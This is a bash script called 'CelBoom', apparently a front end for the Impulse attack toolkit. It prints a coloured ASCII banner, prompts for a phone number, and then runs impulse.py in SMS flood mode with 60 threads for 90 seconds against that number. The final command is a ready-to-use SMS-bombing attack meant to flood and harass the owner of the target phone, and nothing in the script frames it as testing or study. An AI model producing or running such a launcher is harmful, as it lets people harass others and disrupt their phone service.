#!/bin/bash
#
# Created by: Monkey-hk4
#
# 

function CelBoom {
	sleep 0.5
	clear
echo -e ""
echo -e ""
echo -e "\e[1;34m           ▄▄· ▄▄▄ .▄▄▌  \e[0m""\e[31m▄▄▄▄·             • ▌ ▄ ·. \e[0m"
echo -e "\e[1;34m          ▐█ ▌▪▀▄.▀·██•  \e[0m""\e[31m▐█ ▀█▪▪     ▪     ·██ ▐███▪\e[0m"
echo -e "\e[1;34m          ██ ▄▄▐▀▀▪▄██▪  \e[0m""\e[31m▐█▀▀█▄ ▄█▀▄  ▄█▀▄ ▐█ ▌▐▌▐█·\e[0m"
echo -e "\e[1;34m          ▐███▌▐█▄▄▌▐█▌▐▌\e[0m""\e[31m██▄▪▐█▐█▌.▐▌▐█▌.▐▌██ ██▌▐█▌\e[0m"
echo -e "\e[1;34m          ·▀▀▀  ▀▀▀ .▀▀▀ \e[0m""\e[31m·▀▀▀▀  ▀█▄▀▪ ▀█▄▀▪▀▀  █▪▀▀▀\e[0m"
echo -e ""
sleep 0.5
echo -e "
\e[1;33m                                       \e[1;33m$¶    ¶     ¶¢
\e[1;30m                           ¶¶¶\e[33m¶¶¶¶        \e[1;33m¶¢ ¶  ø¶
\e[1;30m                          ¶¶   \e[33m ø¶¶¶      \e[1;33moø  ø  øowo
\e[1;30m                          ¶7    \e[33m  ¶¶¶      \e[1;33m1   1    1o
\e[37m                        ¶¶¶¶¶¶¶     \e[33m ¶¶¶7       \e[1;33m1o¶¶¶ø
\e[37m                        ¶¶¶¶¶¶¶     \e[33m    ¶¶¶\e[1;33m¶¶¶¶¶  1
\e[37m                      o¶¶¶¶¶¶¶¶¶ø             \e[1;33m   o$¢
\e[37m                    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         \e[1;33m¢  1ø   1¶¶
\e[37m                   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶       \e[1;33m 1$   ¶
\e[37m                  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     \e[1;33m ¶    o¶
\e[37m                 ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶  \e[1;33m ¶¶
\e[37m                  ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\e[37m                   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
\e[37m                     ¶¶¶¶¶¶¶¶¶¶¶¶¶
\e[37m                       ¶¶¶¶¶¶¶¶¶  "
echo ""                                                
sleep 0.5
echo -e "\e[32m                           3.0           "
echo -e ""
sleep 0.5
echo -e "\e[33m                      💣  Monkey-hk4 💣  "

}

function PHONE {
echo -e -n "\e[36m
┌─┬┬┬┬──┬─┬┬┬─┐
│││││││││┴┤┌┤┼│
└┴─┴─┴┴┴┴─┴┘└─┘
\e[35m════\e[32m>>\e[0m "
read -r phone
}
#
# CÓDIGO
#
CelBoom
PHONE
cd Impulse
python3 impulse.py --method SMS --time 90 --threads 60 --target ${phone}
